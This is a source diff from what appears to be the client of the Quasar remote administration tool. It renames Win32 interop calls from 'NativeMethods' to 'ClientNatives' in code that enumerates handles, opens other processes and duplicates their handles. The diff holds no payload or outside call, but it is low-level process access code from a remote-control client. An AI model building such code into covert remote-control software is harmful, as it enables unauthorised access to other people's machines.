@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Quasar.Client.Utilities;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Runtime.InteropServices;
@@ -232,7 +233,7 @@ namespace Quasar.Client.Win32PE.Structs
 
                     case "Process":
                         addAccessRights = (int)(ProcessAccessRights.PROCESS_VM_READ | ProcessAccessRights.PROCESS_QUERY_INFORMATION);
-                        NativeMethods.CloseHandle(dupHandle);
+                        ClientNatives.CloseHandle(dupHandle);
                         dupHandle = DuplicateHandle(ownerPid, handle, addAccessRights);
                         break;
 
@@ -247,7 +248,7 @@ namespace Quasar.Client.Win32PE.Structs
                     case "Process":
                     {
                         var processName = GetProcessName(dupHandle);
-                        var processId = NativeMethods.GetProcessId(dupHandle);
+                        var processId = ClientNatives.GetProcessId(dupHandle);
 
                         return $"{processName}({processId})";
                     }
@@ -255,7 +256,7 @@ namespace Quasar.Client.Win32PE.Structs
                     case "Thread":
                     {
                         var processName = GetProcessName(ownerPid);
-                        var threadId = NativeMethods.GetThreadId(dupHandle);
+                        var threadId = ClientNatives.GetThreadId(dupHandle);
 
                         return $"{processName}({ownerPid}): {threadId}";
                     }
@@ -286,7 +287,7 @@ namespace Quasar.Client.Win32PE.Structs
             finally
             {
                 if (dupHandle != IntPtr.Zero)
-                    NativeMethods.CloseHandle(dupHandle);
+                    ClientNatives.CloseHandle(dupHandle);
             }
 
             return "";
@@ -298,7 +299,7 @@ namespace Quasar.Client.Win32PE.Structs
 
             try
             {
-                processHandle = NativeMethods.OpenProcess(
+                processHandle = ClientNatives.OpenProcess(
                     ProcessAccessRights.PROCESS_QUERY_INFORMATION | ProcessAccessRights.PROCESS_VM_READ, false, ownerPid);
 
                 if (processHandle == IntPtr.Zero)
@@ -309,7 +310,7 @@ namespace Quasar.Client.Win32PE.Structs
             finally
             {
                 if (processHandle != IntPtr.Zero)
-                    NativeMethods.CloseHandle(processHandle);
+                    ClientNatives.CloseHandle(processHandle);
             }
         }
 
@@ -319,7 +320,7 @@ namespace Quasar.Client.Win32PE.Structs
                 return "";
 
             var sb = new StringBuilder(4096);
-            var getResult = NativeMethods.GetModuleFileNameEx(processHandle, IntPtr.Zero, sb, sb.Capacity);
+            var getResult = ClientNatives.GetModuleFileNameEx(processHandle, IntPtr.Zero, sb, sb.Capacity);
             if (getResult == 0)
                 return "";
 
@@ -370,7 +371,7 @@ namespace Quasar.Client.Win32PE.Structs
             foreach (var drive in logicalDrives)
             {
                 var lpDeviceName = drive.Substring(0, 2);
-                NativeMethods.QueryDosDevice(lpDeviceName, lpTargetPath, MAX_PATH);
+                ClientNatives.QueryDosDevice(lpDeviceName, lpTargetPath, MAX_PATH);
                 localDeviceMap.Add(NormalizeDeviceName(lpTargetPath.ToString()), lpDeviceName);
             }
 
@@ -411,7 +412,7 @@ namespace Quasar.Client.Win32PE.Structs
             {
                 while (true)
                 {
-                    ret = NativeMethods.NtQueryObject(state.Handle,
+                    ret = ClientNatives.NtQueryObject(state.Handle,
                         OBJECT_INFORMATION_CLASS.ObjectNameInformation, ptr, guessSize, out var requiredSize);
 
                     if (ret == NT_STATUS.STATUS_INFO_LENGTH_MISMATCH)
@@ -452,7 +453,7 @@ namespace Quasar.Client.Win32PE.Structs
             {
                 while (true)
                 {
-                    ret = NativeMethods.NtQueryObject(handle,
+                    ret = ClientNatives.NtQueryObject(handle,
                         OBJECT_INFORMATION_CLASS.ObjectTypeInformation, ptr, guessSize, out var requiredSize);
 
                     if (ret == NT_STATUS.STATUS_INFO_LENGTH_MISMATCH)
@@ -483,18 +484,18 @@ namespace Quasar.Client.Win32PE.Structs
 
         private static IntPtr DuplicateHandle(int ownerPid, IntPtr targetHandle, int addAccessRights)
         {
-            var currentProcess = NativeMethods.GetCurrentProcess();
+            var currentProcess = ClientNatives.GetCurrentProcess();
 
             var targetProcessHandle = IntPtr.Zero;
             var duplicatedHandle = IntPtr.Zero;
 
             try
             {
-                targetProcessHandle = NativeMethods.OpenProcess(ProcessAccessRights.PROCESS_DUP_HANDLE, false, ownerPid);
+                targetProcessHandle = ClientNatives.OpenProcess(ProcessAccessRights.PROCESS_DUP_HANDLE, false, ownerPid);
                 if (targetProcessHandle == IntPtr.Zero)
                     return IntPtr.Zero;
 
-                var dupResult = NativeMethods.DuplicateHandle(targetProcessHandle, targetHandle, currentProcess,
+                var dupResult = ClientNatives.DuplicateHandle(targetProcessHandle, targetHandle, currentProcess,
                     out duplicatedHandle, addAccessRights, false,
                      addAccessRights == 0 ? DuplicateHandleOptions.DUPLICATE_SAME_ACCESS : 0);
                 if (dupResult == true)
@@ -505,7 +506,7 @@ namespace Quasar.Client.Win32PE.Structs
             finally
             {
                 if (targetProcessHandle != IntPtr.Zero)
-                    NativeMethods.CloseHandle(targetProcessHandle);
+                    ClientNatives.CloseHandle(targetProcessHandle);
             }
         }
 
